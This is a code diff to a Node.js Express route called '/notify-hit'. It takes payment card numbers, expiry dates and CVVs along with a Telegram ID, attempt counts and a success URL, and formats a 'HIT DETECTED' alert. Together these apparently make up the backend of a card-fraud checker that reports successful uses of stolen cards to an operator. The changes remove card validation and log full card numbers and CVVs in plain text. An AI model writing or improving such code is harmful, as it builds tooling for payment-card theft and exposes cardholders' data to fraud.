@@ -118,30 +118,27 @@ router.post('/notify-hit', hitLimiter, async (req, res) => {
   const tgId = String(tg_id || '').trim();
 
   // Debug logging for incoming data
-  console.log('[HIT_NOTIFICATION] Received:', { tg_id: tgId, name, card, attempts, amount, success_url, email, time_sec });
+  console.log('[HIT_NOTIFICATION] Received data:', {
+    tg_id: tgId,
+    name,
+    card: card || 'NO_CARD_DATA',
+    attempts,
+    amount: amount || 'NO_AMOUNT_DATA',
+    success_url: success_url || 'NO_URL_DATA',
+    email: email || 'NO_EMAIL_DATA',
+    time_sec
+  });
 
   // Validate Telegram ID
   if (!tgId || !/^\d{5,15}$/.test(tgId)) {
     return res.status(400).json({ ok: false, error: 'Invalid Telegram ID format' });
   }
 
-  // Validate card data format (basic validation) - made more lenient
-  if (card && typeof card === 'string') {
-    const cardParts = card.split('|');
-    if (cardParts.length !== 4) {
-      console.warn('Invalid card format - expected 4 parts separated by |, got:', card);
-      // Don't reject, just log and continue with empty card
-      card = '';
-    } else {
-      const [cardNum, month, year, cvv] = cardParts;
-      // More lenient validation - just check they're not empty and contain digits
-      if (!cardNum || !month || !year || !cvv ||
-          !/\d/.test(cardNum) || !/\d/.test(month) || !/\d/.test(year) || !/\d/.test(cvv)) {
-        console.warn('Invalid card data format - parts missing or non-numeric:', { cardNum, month, year, cvv });
-        // Don't reject, just log and continue with empty card
-        card = '';
-      }
-    }
+  // Log card data for debugging (don't validate/clear)
+  if (card) {
+    console.log('Card data received:', typeof card, card);
+  } else {
+    console.log('No card data received');
   }
 
   // Validate attempts
@@ -184,11 +181,21 @@ router.post('/notify-hit', hitLimiter, async (req, res) => {
       console.warn('Failed to parse success_url:', success_url);
     }
   }
-  const cardDisplay = (card && card.trim()) ? card.replace(/\|/g, ' | ') : '—';
-  // Debug logging for card data
-  if (!card || !card.trim()) {
-    console.log('No card data received in hit notification:', { card, attempts, tgId });
+  // Format card display - be very permissive
+  let cardDisplay = '—';
+  if (card) {
+    if (typeof card === 'string' && card.trim()) {
+      // Replace pipes with spaces for better readability
+      cardDisplay = card.replace(/\|/g, ' | ');
+    } else if (card && typeof card === 'object') {
+      // Handle object format (number, month, year, cvv properties)
+      if (card.number) {
+        cardDisplay = `${card.number} | ${card.month || 'XX'} | ${card.year || 'XX'} | ${card.cvv || 'XXX'}`;
+      }
+    }
   }
+
+  console.log('Card display result:', { original: card, display: cardDisplay });
   const emailDisplay = (email && String(email).trim()) || '—';
   const timeDisplay = (time_sec != null && time_sec !== '') ? `${time_sec}s` : '—';
   const hitText = `🎯 <b>HIT DETECTED</b>\n` +
